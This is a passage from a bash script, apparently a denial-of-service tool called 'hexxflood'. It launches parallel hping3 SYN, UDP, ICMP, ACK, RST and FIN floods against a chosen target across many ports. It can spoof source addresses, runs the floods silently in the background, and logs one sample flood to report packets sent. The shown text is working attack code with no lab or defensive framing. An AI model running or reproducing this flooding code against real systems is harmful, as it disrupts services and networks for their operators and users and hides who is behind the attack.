                    syn) for p in $TCP_PORTS; do sudo $DETACH hping3 -S --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >/dev/null 2>&1 & done ;;
                    udp) for p in $UDP_PORTS; do sudo $DETACH hping3 -2 --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >/dev/null 2>&1 & done ;;
                    icmp) sudo $DETACH hping3 -1 --flood $SPOOF_FLAG -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >/dev/null 2>&1 & ;;
                    ack) for p in $TCP_PORTS; do sudo $DETACH hping3 -A --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >/dev/null 2>&1 & done ;;
                    rst) for p in $TCP_PORTS; do sudo $DETACH hping3 -R --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >/dev/null 2>&1 & done ;;
                    fin) for p in $TCP_PORTS; do sudo $DETACH hping3 -F --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >/dev/null 2>&1 & done ;;
                esac
            done
        done

        # One extra "sampler" flood whose real hping3 output is captured to a log
        # (the bulk floods above stay silent for speed). It mirrors the first
        # selected attack type so the banner reflects the actual attack, and its
        # "packets transmitted" summary is shown on stop. stdin=/dev/null + output
        # to a file means it never touches the TTY, so no setsid is needed and we
        # keep its PID to SIGINT it cleanly for the summary.
        HPING_LOG="/tmp/hexxflood_hping.log"
        : > "$HPING_LOG" 2>/dev/null
        local first_type sport uport
        first_type=$(echo "$ATTACK_TYPES" | cut -d',' -f1)
        sport="${TCP_PORTS%% *}"; uport="${UDP_PORTS%% *}"
        case "$first_type" in
            udp)  sudo hping3 -2 --flood $SPOOF_FLAG -p ${PP}$uport -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >"$HPING_LOG" 2>&1 & ;;
            icmp) sudo hping3 -1 --flood $SPOOF_FLAG            -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >"$HPING_LOG" 2>&1 & ;;
            ack)  sudo hping3 -A --flood $SPOOF_FLAG -p ${PP}$sport -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >"$HPING_LOG" 2>&1 & ;;
            rst)  sudo hping3 -R --flood $SPOOF_FLAG -p ${PP}$sport -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >"$HPING_LOG" 2>&1 & ;;
            fin)  sudo hping3 -F --flood $SPOOF_FLAG -p ${PP}$sport -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >"$HPING_LOG" 2>&1 & ;;
            *)    sudo hping3 -S --flood $SPOOF_FLAG -p ${PP}$sport -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >"$HPING_LOG" 2>&1 & ;;
        esac
        HPING_SAMPLER_PID=$!
    fi

    # Detach the background flood jobs from job control so bash doesn't print
    # async "Killed"/"Terminated" notices over our output when cleanup kills them.
    disown -a 2>/dev/null || true

    monitor_attack
}

main "$@"
